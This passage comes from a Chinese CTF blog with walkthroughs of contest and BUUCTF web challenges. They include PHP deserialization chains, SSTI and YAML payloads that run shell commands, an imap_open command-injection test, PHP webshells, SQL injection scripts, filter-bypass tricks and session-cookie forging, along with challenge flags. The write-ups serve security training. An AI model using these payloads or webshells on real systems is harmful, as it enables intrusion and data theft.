的base64值，然后刷新可以看到一个命令执行界面，测试发现题目过滤了空格，尝试用$IFS绕过\n`cat$IFS/ffLAG_404` ，然后即可成功绕过\n\n![result](https://i.loli.net/2019/01/16/5c3f3979d4b1c.png)\n\n<!-- flag{6f1d95159e3b90ed28186c518dd15e8c} -->\n\n# 1月月赛\n\n## web\n\n### babygo\n\n代码审计题目\n\n```php \n@error_reporting(1); \ninclude 'flag.php';\nclass baby \n{   \n    protected $skyobj;  \n    public $aaa;\n    public $bbb;\n    function __construct() \n    {      \n        $this->skyobj = new sec;\n    }  \n    function __toString()      \n    {          \n        if (isset($this->skyobj))  \n            return $this->skyobj->read();      \n    }  \n}  \nclass cool \n{    \n    public $filename;     \n    public $nice;\n    public $amzing; \n    function read()      \n    {   \n        $this->nice = unserialize($this->amzing);\n        $this->nice->aaa = $sth;\n        if($this->nice->aaa === $this->nice->bbb)\n        {\n            $file = \"./{$this->filename}\";        \n            if (file_get_contents($file))         \n            {              \n                return file_get_contents($file); \n            }  \n            else \n            { \n                return \"you must be joking!\"; \n            }    \n        }\n    }  \n}  \nclass sec \n{  \n    function read()     \n    {          \n        return \"it's so sec~~\";      \n    }  \n}  \nif (isset($_GET['data']))  \n{ \n    $Input_data = unserialize($_GET['data']);\n    echo $Input_data; \n} \nelse \n{ \n    highlight_file(\"./index.php\"); \n} \n```\n\n题目考察pop链的构造，核心点在于\n\n```php\n$this->nice->aaa = $sth;\nif($this->nice->aaa === $this->nice->bbb)\n```\n\n代码中修改了变量的值，这样if函数验证就无法通过，为了解决这个问题可以使用PHP中的指针（引用），是$aaa指向变量$bbb，这样修改了$aaa的值即相当于修改了$bbb的值\n\n构造pop链如下\n\n```php\nerror_reporting(1);\nclass baby \n{   \n    protected $skyobj;  \n    public $aaa;\n    public $bbb;\n    function __construct() \n    {      \n        $this->skyobj = new cool();\n    }  \n}  \nclass cool \n{    \n    public $filename = \"flag.php\";     \n    public $nice;\n    public $amzing = 'O:4:\"baby\":3:{s:9:\" * skyobj\";N;s:3:\"aaa\";s:4:\"snow\";s:3:\"bbb\";R:3;}'; \n}  \n$b = new baby();\necho urlencode(serialize($b));\n```\n\n```\ndata=O%3A4%3A\"baby\"%3A3%3A%7Bs%3A9%3A\"%00%2A%00skyobj\"%3BO%3A4%3A\"cool\"%3A3%3A%7Bs%3A8%3A\"filename\"%3Bs%3A8%3A\"flag.php\"%3Bs%3A4%3A\"nice\"%3BN%3Bs%3A6%3A\"amzing\"%3Bs%3A68%3A\"O%3A4%3A\"baby\"%3A3%3A%7Bs%3A9%3A\"+%2A+skyobj\"%3BN%3Bs%3A3%3A\"aaa\"%3Bs%3A4%3A\"snow\"%3Bs%3A3%3A\"bbb\"%3BR%3A3%3B%7D\"%3B%7Ds%3A3%3A\"aaa\"%3BN%3Bs%3A3%3A\"bbb\"%3BN%3B%7D\n```\n\n查看源代码即可得到flag\n\n```php\n<?php\n// $flag = 'flag{bd75a38e62ec0e450745a8eb8e667f5b}';\n$sth='test5030b66d4bdtest35daed9d51e2688377299test';\n```\n\n\n## MISC\n\n### zhunianjixiang\n\n题目是一张图片，但是却有2MB，一看就藏东西了，foremost分离一下\n\n```\nforemost zhu.jpg\n```\n\n然后即可得到一张二维码，扫描一下\n\n![](https://i.loli.net/2019/01/31/5c52a84fc2d4e.png)\n\n看来还有其他东西，stegsolve上查看一下得到flag\n\n![](https://i.loli.net/2019/01/31/5c52a85a2c2bf.png)\n\n```\nflag{You_ARE_SOsmart}\n```\n\n## CRYPTO\n\n### 真的是键盘吗\n\n> ypau_kjg;\"g;\"ypau+\n\n题目的提示不好，原题目的提示是`键盘之争`，百度一下即可发现是考察键盘的两种布局方式[链接](http://www.ruanyifeng.com/blog/2006/11/disputation_of_keyboards_qwerty_or_dvorak.html)，按照两种方式一一对应即可\n\n```python\nQWERTY = ['q','w','e','r','t','y','u','i','o','p','{','}','|','a','s','d','f','g','h','j','k','l',';','\"','z','x','c','v','b','n','m','<','>','?','_','+']\nDvorak = ['\"','<','>','p','y','f','g','c','r','l','?','+','|','a','o','e','u','i','d','h','t','n','s','_',';','q','j','k','x','b','m','w','v','z','{','}']\ndic = dict(zip(QWERTY,Dvorak))\nflag = ''\ns = 'ypau_kjg;\"g;\"ypau+'\nfor i in s:\n    flag += dic[i]\nprint(flag)\n```\n\n> flag{this_is_flag}\n\n### get it\n\n>Alice和Bob正在进行通信，作为中间人的Eve一直在窃听他们两人的通信。\n>\nEve窃听到这样一段内容，主要内容如下：\np = 37\nA = 17\nB = 31\n>\nU2FsdGVkX1+mrbv3nUfzAjMY1kzM5P7ok/TzFCTFGs7ivutKLBLGbZxOfFebNdb2\nl7V38e7I2ywU+BW/2dOTWIWnubAzhMN+jzlqbX6dD1rmGEd21sEAp40IQXmN/Y0O\nK4nCu4xEuJsNsTJZhk50NaPTDk7J7J+wBsScdV0fIfe23pRg58qzdVljCOzosb62\n7oPwxidBEPuxs4WYehm+15zjw2cw03qeOyaXnH/yeqytKUxKqe2L5fytlr6FybZw\nHkYlPZ7JarNOIhO2OP3n53OZ1zFhwzTvjf7MVPsTAnZYc+OF2tqJS5mgWkWXnPal\n+A2lWQgmVxCsjl1DLkQiWy+bFY3W/X59QZ1GEQFY1xqUFA4xCPkUgB+G6AC8DTpK\nix5+Grt91ie09Ye/SgBliKdt5BdPZplp0oJWdS8Iy0bqfF7voKX3VgTwRaCENgXl\nVwhPEOslBJRh6Pk0cA0kUzyOQ+xFh82YTrNBX6xtucMhfoenc2XDCLp+qGVW9Kj6\nm5lSYiFFd0E=\n>\n分析得知，他们是在公共信道上交换加密密钥，共同建立共享密钥。\n>\n而上面这段密文是Alice和Bob使用自己的密值和共享秘钥，组成一串字符的md5值的前16位字符作为密码使用另外一种加密算法加密明文得到的。\n>\n例如Alice的密值为3，Bob的密值为6，共享秘钥为35，那么密码为：\n>\npassword = hashlib.md5(\"(3,6,35)\").hexdigest()[0:16]\n\n# 二月月赛\n\n## WEB\n\n注册登录，有个邮箱验证功能，验证之后新增一个改变背景的功能，允许图片上传，但是只允许上传jpg图片，查看源代码可以看到图片的存储位置\n![](https://i.loli.net/2019/02/28/5c778a7acd48e.png)\n上传测试可以发现文件会被强制命名为`用户名.jpg`，截断什么的也不存在，当时就是做到这里没思路了，看了飘零学长的思路之后，知道了imap_open思路，该函数原型为\n\n```php\nimap_open(string $mailbox, string $username, string $password [, int $options = 0 [, int $n_retries = 0 [, array $params = NULL ]]] ) : resource\n```\n\n漏洞在于$mailbox，用docker来测试一下\n\n```\ndocker search imap\ndocker pull fedosov/docker-php-imap-composer\ndocker run -itd fedosov/docker-php-imap-composer /bin/bash\ndocker attach id\n```\n\n写入一个实现漏洞测试函数\n```php\n<?php\n$payload = \"echo skysky|tee /tmp/success\";\n$encoded_payload = base64_encode($payload);\n$server = \"any -o ProxyCommand=echo\\t\".$encoded_payload.\"|base64\\t-d|bash\";\n@imap_open('{'.$server.'}:143/imap}INBOX', '', '');\n```\n\n在执行之前/tmp目录为空，运行该文件之后生成了success文件，据此我们可以通过邮箱验证功能向/user目录中写入文件，\n\n但是实际操作失败了，不知道原因为何。\n\n## MISC\n\n### 非常简单的流量分析\n\n```\nhttp contains \"robots.txt\"\n```\n\n追踪http流可以看到存在abc.html页面，接续追踪该流量，查看abc.html页面内容\n\n>md5 0x99a98e067af6b09e64f3740767096c96\n>\n>DES 0xb19b21e80c685bcb052988c11b987802d2f2808b2c2d8a0d  (129->143)\n>\n>DES 0x684a0857b767672d52e161aa70f6bdd07c0264876559cb8b  (143->129)\n\n当时做到这里僵住了，没有考虑后面的ESP流量包，看wp可知ESP是通过IpSec协议加密过的流量，需要解密流量包\n\n按照配置网上的思路配置一下esp秘钥，依次选择`编辑->首选项->Protocols->ESP`\n\n添加配置信息，协议选择ipv4，源IP和目的IP填好，SPI在数据包里面有，Encrypt选择TripleDES-CBC，选择对应的des秘钥， authentication选择MD5，选择上面MD5值\n![](https://i.loli.net/2019/02/28/5c7779afb7a07.png)\n\n之后即可得到解密报文\n\n发现http报文有点特殊\n\n![](https://i.loli.net/2019/02/28/5c7779ee0e7c4.png)\n\n可以看到前几位是flag的ascii码值，将此种类型数据包提取出来处理一下\n\n```python\nimport re\n\nwith open('2.txt','r') as f:\n    content = f.read()\n    flag = ''\n    par = re.findall(r'include/information/.*_(.*)\\.php',content)\n    for i in par:\n        flag += chr(int(i))\n    print(flag)\n```\n\nflag：`flag{27b03b758f255276e5a98da0e1947bed}`\n\n","tags":["CTF"],"categories":["复现"]},{"title":"应急挑战杯2019复现","url":"/2020/09/13/YJTZB2019/","content":"历史文章补发\n\n# 前言\n\n第一次线下AWD，打的有些遗憾，不过还是学到了许多东西，因为是awd的原因，题目整体难度挺低的，将题目完整复现一下\n\n<!--more-->\n\n# Flask商城\n\n## popen()命令执行\n\n在search路由处存在命令执行漏洞\n\n```python\nif request.method == \"POST\":\n    url = request.form['search']\n\n    msg = os.popen(url).read() \n    if not msg == '':\n        return render_template(\"search.html\", msg=msg)\n    else:\n        return render_template(\"search.html\", msg=\"Error.Check your command.\")\n```\n\n非常明显的一个命令执行，popen函数用于从一个命令打开一个管道，会返回一个文件对象，所以可以被用来执行任意系统命令，由于比赛使用的gunicorn服务器，很多人修了洞之后却无法生效（因为没有重启gunicorn服务...）\n\n## SSTI漏洞\n\n在定义404返回的路由处存在ssti\n```python\n@app.errorhandler(404)\ndef page_not_found(e):\n    template = '''\n        {%% block body %%}\n        <div class=\"center-content error\">\n        <h1>哇哦，This page doesn't exist.</h1>\n        <h3>%s</h3>\n        <h3>这里什么都没有呢٩(๑❛ᴗ❛๑)۶</h3>\n        </div>\n        {%% endblock %%}\n        ''' % (request.url)\n    return render_template_string(template), 404\n```\n\n找到SSTI漏洞，接下来就是沙盒逃逸，可用payload如下：\n\n```\n\"\".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"cat /flag > /home/snow/sandbox\")')'\n```\n\n实例调用\\_\\_class\\_\\_属性时会指向该实例所对应的类；由于python允许多重继承，\\_\\_mro\\_\\_可以得到该类继承的父类，builtins是解释器自动导入的内置类，\\_\\_import\\_\\_()函数能够动态导入一些类从而进行命令执行\n\n由于flask使用的模板渲染引擎是jinja2，所以payload还可以更简单一些，我们其实随便输入字符串都是有用的，jinja会生成一个undefined类`<class 'jinja2.runtime.Undefined'>`，我们可以直接进行逃逸\n\n```\nvvv.__class__.__init__.__globals__['__builtins__']['eval']('__import__(\"os\").system(\"cat /flag > /home/snow/sandbox\")')\n```\n\n## yaml反序列化\n\nyaml库在使用yaml.load()方法解析yaml文件时会存在反序列化漏洞，可以使用yaml.safe_load()方法来避免该漏洞\n\n想要序列化的类名必须使用上下文中存在的类名，但是类名中不一定有执行命令的相应方法，所以最好是通过构造标准类或类函数来实现命令执行，编辑如下文件并上传即可\n\n```\n*-* exp.yml *-*\n\n!!python/object/new:subprocess.check_output [[\"cat\",\"/flag\"]]\n```\n\n# easyweb\n\n## 1、 反序列化\n\n反序列化漏洞有两处\n\n第一处在首页存在提示\n\n![](YJTZB2019/1.png)\n\n定位到cacf.php，查看代码，可以通过反序列化进行文件写入\n```php\nclass chybeta{\n    //\n    var $test = 'pcaq';\n    function __wakeup(){\n        $fp = fopen(\"log.php\",\"w\") ;       \n        fwrite($fp,$this->test);\n        fclose($fp);\n    }\n}\n```\n\n反序列化写入shell\n```php\n<?php \nclass chybeta{\n    //\n    var $test = '<?php eval($_GET[\"snow\"]);?>';\n}\n$a = new chybeta();\n$a = serialize($a);\necho $a;\n```\n\n![](YJTZB2019/2.png)\n\n第二处在common/home.php中\n\n```php\nclass home{\n    \n    private $method;\n    private $args;\n    function __construct($method, $args) {\n        \n      \n        $this->method = $method;\n        $this->args = $args;\n    }\n\n    function __destruct(){\n        if (in_array($this->method, array(\"ping\"))) {\n            call_user_func_array(array($this, $this->method), $this->args);\n        }\n    } \n\n    function ping($host){\n        system(\"ping -c 2 $host\");\n    }\n    function waf($str){\n        $str=str_replace(' ','',$str);\n        return $str;\n    }\n\n    function __wakeup(){\n        foreach($this->args as $k => $v) {\n            $this->args[$k] = $this->waf(trim(mysql_escape_string($v)));\n        }\n    }   \n}\n$a=@$_POST['a'];\n@unserialize(base64_decode($a));\n```\n\n在析构函数中通过调用ping函数可以实现命令执行，但是在waf函数中屏蔽了空格，用$IFS可以绕过\n\n```php\nclass home{\n    private $method;\n    private $args;\n    function __construct($method, $args) {      \n        $this->method = $method;\n        $this->args = $args;\n    }\n}\n$arr = array(\"127.0.0.1;cat\\$IFS/flag\");\n$obj = new home(\"ping\" ,$arr);\n$obj = serialize($obj);\n$obj = base64_encode($obj);\necho $obj;\n```\n\n![](YJTZB2019/8.png)\n\n## 2、万能密码\n\n登录处存在sql注入\n\n```php\n$sql=\"select * from users where username='$username' and password='$password'\";\n```\n\n可以通过万能密码登录\n\n密码更新处同样也存在update注入\n\n```php\n$sql=\"update users set password='$password' where id='\".$_SESSION['id'].\"';\";\n```\n\n## 3、命令执行\n\n在User.php中存在ping函数可以进行命令执行\n\n```php\nfunction ping(){\n        $host = $_POST['host'];\n        system(\"ping -c $host\");\n    }\n```\n\n![](YJTZB2019/3.png)\n\n## 4、预置后门\n\n预置后门有两个，一个在include/shell.php\n\n```php\n<?php\n@eval($_POST['admin_ccmd']);\n```\n\n另一个在org/smarty/Autofoucer.php\n\n![](YJTZB2019/7.png)\n\n## 5、日志文件写入\n\n根目录下log.php会记录网站访问记录，可以通过构造恶意访问写入shell\n\n![](YJTZB2019/9.png)\n\n![](YJTZB2019/4.png)\n\n## 6、上传漏洞\n\n登录之后存在上传界面，查看上传逻辑代码\n\n```php\n$this->notallow=array(\"php\", \"php5\", \"php3\", \"php4\", \"php7\", \"pht\", \"phtml\", \"htaccess\",\"html\", \"swf\", \"htm\");\nfunction save(){\n    $id=$_SESSION['id'];\n    $upfile=$_FILES['pic'];\n    $fileinfo=pathinfo($upfile[\"name\"]);\n    if(in_array($fileinfo[\"extension\"],$this->notallow)){\n        exit('error');\n}\n```\n\n没有对大小写进行过滤，可以构造恶意文件上传\n\n![](YJTZB2019/5.png)\n\n![](YJTZB2019/6.png)\n\n# Thinkphp5\n\n公开CVE，略\n\n\n**reference：**\n[https://xz.aliyun.com/t/52](https://xz.aliyun.com/t/52)\n[https://xz.aliyun.com/t/2908#toc-0](https://xz.aliyun.com/t/2908#toc-0)","tags":["AWD"],"categories":["复现"]},{"title":"BUUCTF_WEB(一)","url":"/2020/04/02/buuctf/","content":"\n\n今年寒假真的太长了，后半年又因为考研什么都没学，趁这段时间复现学习一波~\n\n<!-- more -->\n\n# [极客大挑战 2019]EasySQL\n\n简单的万能密码即可登录\n\n```\nhttp://b8506b10-95f5-4f01-b77a-8485ee19e068.node3.buuoj.cn/check.php?username=admin%27+or+1%23&password=fads\n```\n\n# [极客大挑战 2019]Havefun\n\n签到题，查看网页源代码\n\n```php\n<!--\n        $cat=$_GET['cat'];\n        echo $cat;\n        if($cat=='dog'){\n            echo 'Syc{cat_cat_cat_cat}';\n        }\n        -->\n```\n\n然后提交get参数`cat=dog`即可getflag\n\n# [极客大挑战 2019]FinalSQL\n\n本题是一个数字型注入，注入点在`id`参数，过滤了部分敏感词，如`and`，`空格`等，使用异或符号可以正常返回数据\n\n```\nid=0^(1)\n```\n\n所以可以据此进行盲注，但是题目过滤了空格，经过尝试发现空格无法用特殊字符绕过，不过此处可以使用无空格方式来注入，即通过括号包裹来避免使用空格，比如：\n```sql\nselect(*)from(admin);\n```\n\n盲注脚本如下\n\n```python\nimport requests\nimport string\n\n\nbase_url = 'http://33afb64c-ecb9-427b-b24e-100dbb7dd810.node3.buuoj.cn/search.php'\nws = string.printable[:-6]\nsign = \"NO! Not this\"\ntable_name = \"F1naI1y,Flaaaaag\"\n# column_name = 'id,fl4gawsl'   Flaaag\n# column_name = 'id,username,password'\ncolumn_name = 'mygodcl4y_is_really_amazing,welco'\nwhile True:\n    for i in ws:\n        # payload1 = \"?id=0^(select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)\"\\\n            # \"where(table_schema=database())),{},1))={}))\"\n        # payload2 = \"?id=0^(select(ascii(substr((select(group_concat(column_name))from(information_schema.columns)\"\\\n            # \"where(table_name='F1naI1y')),{},1))={}))\"\n        payload2 = \"?id=0^(select(ascii(substr((select(group_concat(username,password))from(F1naI1y)),{},1))={}))\"\n        res = requests.get(base_url + payload2.format(len(column_name)+1, ord(i))).content.decode('utf-8')\n        if sign in res:\n            column_name += i\n            print(column_name)\n            break\n```\n\n不得不吐槽一下的是flag所在表数据真的有点长，我都怀疑flag是不是不在这个表里面，如果只跑password字段的话应该会短一点\n\n![](buuctf/21.png)\n\n# [极客大挑战 2019]Secret File\n\n打开网站之后查看源代码可以看到提示\n```\n<a id=\"master\" href=\"./Archive_room.php\" style=\"background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;\">Oh! You found me</a>\n```\n访问Archive_room.php，题目提示`没看清么？请回去仔细看看`，应该是发生了跳转，抓包，发现了新的页面`secr3t.php`，访问得到源代码\n```php\n<html>\n    <title>secret</title>\n    <meta charset=\"UTF-8\">\n<?php\n    highlight_file(__FILE__);\n    error_reporting(0);\n    $file=$_GET['file'];\n    if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){\n        echo \"Oh no!\";\n        exit();\n    }\n    include($file); \n//flag放在了flag.php里\n?>\n```\n然后就是文件包含\n```\nhttp://a74e337d-43ce-4de5-af4a-08d701cec8b1.node3.buuoj.cn/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php\n```\n解码即可得到flag\n\n# [极客大挑战 2019]PHP\n题目提示了网站备份，随手测试www.zip可以down到源码\n查看index.php发现存在反序列化\n```php\n<?php\n    include 'class.php';\n    $select = $_GET['select'];\n    $res=unserialize(@$select);\n    ?>\n```\n查看class.php\n```php\ninclude 'flag.php';\nerror_reporting(0);\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function __wakeup(){\n        $this->username = 'guest';\n    }\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n        }\n    }\n}\n```\n很简单的反序列化，username为admin且password为100即可getflag，只需要绕过一下wakeup函数即可\n```php\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n}\n$obj = new Name('admin',100);\n$obj = serialize($obj);\n$obj = str_replace(':2:', ':3:', $obj);\necho urlencode($obj);\n```\npayload:\n```\nO%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D\n```\n\n# [极客大挑战 2019]Knife\n题目直接给出了shell`eval($_POST[\"Syc\"]);`\n然后直接读flag就行了\n![](buuctf/22.png)\n\n# [极客大挑战 2019]LoveSQL\n\n题目毫无过滤，直接一把梭就行了，payload如下：\n```\nview-source:http://4616398c-abd6-4030-87b8-27d8abd6fd4c.node3.buuoj.cn/check.php?username=adin%27union%20select%201,(select%20group_concat(password)%20from%20l0ve1ysq1),3%23&password=addmin\n```\n\n# [极客大挑战 2019]Http\n\n修改指定http头即可\n![](buuctf/23.png)\n\n# [极客大挑战 2019]BabySQL\n\n过滤了or,and,from,union,select,where等字符，可以通过双写绕过，payload\n```\nview-source:http://39ae0ce7-baa4-43ed-9adf-df019b95a001.node3.buuoj.cn/check.php?username=0' uniunionon seselectlect 1,(seleselectct group_concat(passwoorrd) frfromom b4bsql),3-- +&password=456\n```\n\n# [极客大挑战 2019]BuyFlag\n\n题目Attention给出提示\n> If you want to buy the FLAG:\nYou must be a student from CUIT!!!\nYou must be answer the correct password!!!\n\n同时view-source存在源码\n```php\n<!--\n    ~~~post money and password~~~\nif (isset($_POST['password'])) {\n    $password = $_POST['password'];\n    if (is_numeric($password)) {\n        echo \"password can't be number</br>\";\n    }elseif ($password == 404) {\n        echo \"Password Right!</br>\";\n    }\n}\n-->\n```\n也就是说，得到flag需要达到三个条件\n1. 是CUIT's student\n2. 正确的密码\n3. 足够的money\n\n查看返回头可以看到存在cookie`user=0`，猜测可能是身份鉴别字段，修改值为1，这样就通过了CUIT的验证\n> you are Cuiter\nPlease input your password!!\n\npassword字段的验证绕过很简单，`is_numeric`存在截断漏洞，提交`password=404%00aaa`即可绕过\n> you are Cuiter\nPassword Right!\nPay for the flag!!!hacker!!!\n\n然后提交金额100000000\n> you are Cuiter\nPassword Right!\nNember lenth is too long\n\n数字过长可以使用科学计数法，提交`money=1e9`即可getflag\n\n# [极客大挑战 2019]Upload\n\n很简单的上传绕过，需要修改三个点\n1. content-type: image/jpeg\n2. 修改文件后缀名为phtml\n3. 添加图片前缀`GIF89a`\n4. 使用标签`<script language=\"php\"></script>`\n\n![](buuctf/24.png)\n\n上传成功后需要猜测上传目录，实际上传目录为`upload`\ngetflag payload：\n```\nhttp://2625763a-f599-4a0b-a1c7-1f9501ab20d2.node3.buuoj.cn/upload/shell.phtml?snow=system(%27cat%20/flag%27);\n```\n\n# [极客大挑战 2019]HardSQL\n\n报错注入，过滤了空格，可以使用括号包裹绕过，`=<>`也被过滤了，可以使用`in`语句来绕过\n爆表\n```\nhttp://398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn/check.php?username=admin'^(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)in(select(database()))),0x7e),1))%23&password=admin\n```\n\n> H4rDsq1\n\n```\nhttp://398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn/check.php?username=admin'^(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)in(select('H4rDsq1'))),0x7e),1))%23&password=admin\n```\n\n> XPATH syntax error: '\\~id,username,password\\~'\n\n```\nhttp://398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn/check.php?username=admin'^(updatexml(1,concat(0x7e,(select(left(password,31))from(H4rDsq1)),0x7e),1))%23&password=admin\n```\n\n> XPATH syntax error: '\\~flag{7ba38da2-8bbb-4d78-9c9d-6a'\n\n```\nhttp://398e34ad-ff1a-4090-80c3-7917a9249043.node3.buuoj.cn/check.php?username=admin'^(updatexml(1,concat(0x7e,(select(right(password,31))from(H4rDsq1)),0x7e),1))%23&password=admin\n```\n\n> XPATH syntax error: '\\~a2-8bbb-4d78-9c9d-6abe9bc51c29}'\n\n# [极客大挑战 2019]RCE ME\n\n考察命令执行，题目给出了代码\n```php\nerror_reporting(0);\nif(isset($_GET['code'])){\n    $code=$_GET['code'];\n    if(strlen($code)>40){\n        die(\"This is too Long.\");\n    }\n    if(preg_match(\"/[A-Za-z0-9]+/\",$code)){\n        die(\"NO.\");\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n```\n参考P神的一篇博文[无字母数字shell提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)中提到一种方法，在PHP7中，可以使用`($a)()`来执行代码，比如使用`('phpinfo')()`可以执行phpinfo函数\n```php\nphp7 -r \"('phpinfo')();\"\n```\n运行该命令可以看到成功打印PHP信息，不过在版本小于PHP7时是不可以的\n由于不允许出现数字字母，我们需要设法表示字母，可以使用`~`来实现，比如\n```\nphp7 -r \"echo urlencode(~'phpinfo');\"  # 为了避免字符显示问题，所以进行了url编码\n```\n然后运行\n```\nphp7 -r \"(~urldecode('%8F%97%8F%96%91%99%90'))();\";\n\nphpinfo()\nPHP Version => 7.0.12\n\nSystem => Windows NT DESKTOP-S4PD6MS 10.0 build 17763 (Windows 10) i586\nBuild Date => Oct 13 2016 10:44:50\nCompiler => MSVC14 (Visual C++ 2015)\nArchitecture => x86\n```\n可以看到是可以运行的，提交该payload，可以看到phpinfo()执行结果，查看disable_functions选项\n![](buuctf/25.png)\n常用命令执行函数被ban了，可以使用`var_dump+scandir+file_get_contents`组合拳来读取文件\n```\n➜ php7 -r \"echo urlencode(~'var_dump');\"\n%89%9E%8D%A0%9B%8A%92%8F\n➜ php7 -r \"echo urlencode(~'scandir');\"\n%8C%9C%9E%91%9B%96%8D\n```\npayload为`(~%89%9E%8D%A0%9B%8A%92%8F)((~%8C%9C%9E%91%9B%96%8D)(%27/%27));`，相当于执行了`var_dump(scandir('/'));`\n![](buuctf/26.png)\n但是，接下来读取文件时却无法读取，应该是没有相应的权限，根目录下还有一个readflag文件，应该是要调用该程序读取flag\n这样的话需要我们进行绕过disable_functions进行提权，我们先尝试获取一个webshell\n\n查看disable_functions可以看到`assert`没有被ban，可以尝试利用之\n官方文档中说，php7+版本中，assert不再作为函数而是作为一种语言结构，而且默认不能执行代码，不过，使用间接调用的方法却是可以当做函数执行的（不知道为啥），比如：\n```php\nassert(var_dump('aaa'));\n```\n该语句执行时无任何返回，我们使用间接的方式来执行：\n```php\n$a = 'assert';\n$a(var_dump('aaa'));\n```\n\n> string(3) \"aaa\"\nPHP Warning:  assert(): Assertion failed in /var/www/html/rce.php on line 4\n\n此时成功执行\n\n那么，我们就用此方法来getshell，payload如下：\n```\ncode=${~(%A0%B8%BA%AB)}[_](${~(%A0%B8%BA%AB)}[__]);&_=assert&__=eval($_POST[___]);\n```\n![](buuctf/27.png)\n然后使用蚁剑连接，蚁剑中正好有绕过disable_funcs的插件，直接用一下\n![](buuctf/28.png)\n提权之后读flag\n![](buuctf/28.png)\n\nPS：根据出题大佬的原意，第一步的getshell是希望我们实现无文件getshell，并且给出了payload\n```\n?code=(~%9E%8C%8C%9A%8D%8B)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()));\n//(\"assert\")((\"next\")((\"getallheaders\")()));\n```\n然后通过UA头即可执行任意命令\n\n----------\n\n# PHP语言结构（language construct）：\n\n**语言结构与函数相比的一些特征：**\n1. 很多不需要括号，有的会需要\n2. 一些语言结构，能够实现一些函数不可能完成的事情，比如isset，经常会访问一下不存在的变量，如果使用函数来实现会非常难;\n3. 一些语言结构与函数写法存在差异。例如，Array(…)结构可以写成[…]\n4. 正如文档不断提醒我们的，**语言结构不能作为可变函数引用**。即`$a='print_r'; $a(…);`是可以的，而`$a='print';$a(…);`则不行，因为print_r是函数，而print是语言结构\n\n# [护网杯 2018]easy_tornado\n\npython模板注入题目，查看hint.txt可知题目需要知道文件名与签名，flag.txt中已给出了flag位置`/fllllllllllllag`，签名格式为\n\n```php\nmd5(cookie_secret+md5(filename))\n```\n\n所以此题目标就是要获取`cookie_secret`值，当签名错误后会报错，此报错页面存在模板注入\n\n```\nhttp://c031cfdc-f167-430e-858a-52ddf7406018.node3.buuoj.cn/error?msg=Error\n```\n\n简单测试\n\n![](buuctf/1.png)\n\n通过hander对象来进行注入可以得到cookie\n\n![](buuctf/2.png)\n\n然后计算签名获得flag\n\n![](buuctf/3.png)\n\n# [SUCTF 2019]EasySQL\n\n本题是数字型注入，测试过滤\n\n![](buuctf/4.png)\n\n发现题目可以进行堆叠注入，本来想利用`execute`来执行语句，但是过滤了prepare，根据探测发现目标表名为`Flag`\n\n![](buuctf/5.png)\n\n但是flag被过滤了，`from`字段也没法用，这里做到这儿就没思路了，查看资料发现解法是设置sql_mode，真的学到了\n\n本题需要猜测后端的SQL语句，当输入0无数据返回，输入1会返回数据，所以后端可能是存在异或的\n\n![](buuctf/6.png)\n\n后端sql语句可能是\n\n```php\n$sql = \"select \".$query.\"||flag from Flag\";\n```\n\n所以我们直接输入`*,1`也可以得到flag\n\n除此之外，官方解法还可以通过设置sql_mode来解决，将`||`变为类似Oracle的管道连接符\n\n![](buuctf/7.png)\n\npayload如下：\n\n```sql\n1;set sql_mode=pipes_as_concat;select 1\n```\n\n![](buuctf/8.png)\n\n# [HCTF 2018]admin\n\n查看源代码发现提示信息\n\n```\n<!-- you are not admin -->\n```\n\n需要我们以admin身份登录，浏览之后发现有注册功能，随便注册一个账号，登录之后看到存在cookie，应该是要伪造cookie，查看cookie格式应该是flask下的cookie，那么伪造的话我们需要获得secret_key，尝试了模板注入没有发现，最终在change页面发现源代码地址\n\n```\n<!-- https://github.com/woadsl1234/hctf_flask/ -->\n```\n\n查看源代码可以得知secret_key为`ckj123`\n\n然后就是正常的cookie伪造\n\n```\npy .\\flask_session_cookie_manager3.py decode -c '.eJxNkMGKwjAURX9lyNpFmupGcFGJU1J4L1QyE_I2MqNVm1iFVqmN-O9TXc32wD1w7oNt9m3VHdn82t6qCdvUOzZ_sI9fNmeYlz0ZFUGGQRvHtVwJyt0dPQiwVKOFAeUhYoRE23Xj7GpAQQGN4mi_j-iXwfml11IJZ4sa5WtbnJxQA8QiUL7i2mScbJmO3imZLCVTBJQZd2JdYwMJCDUDW5wo_xy5SsGXXOcYyGCjbdmjD_dxu2DPCdt27X5zvYTq_C9h1PqQogHuouqd30b0B06-nGq5q1-cJAiyX2OKmrkIUzos3rrzT1ONiu586dmE3bqqfZ_DEs6ef_NiYyk.XkThtA.0N3JaixDVMTckrVyXBvrmGo7sgI' -s 'ckj123'\n```\n\n```\npy .\\flask_session_cookie_manager3.py encode -t \"{'_fresh': True, '_id': 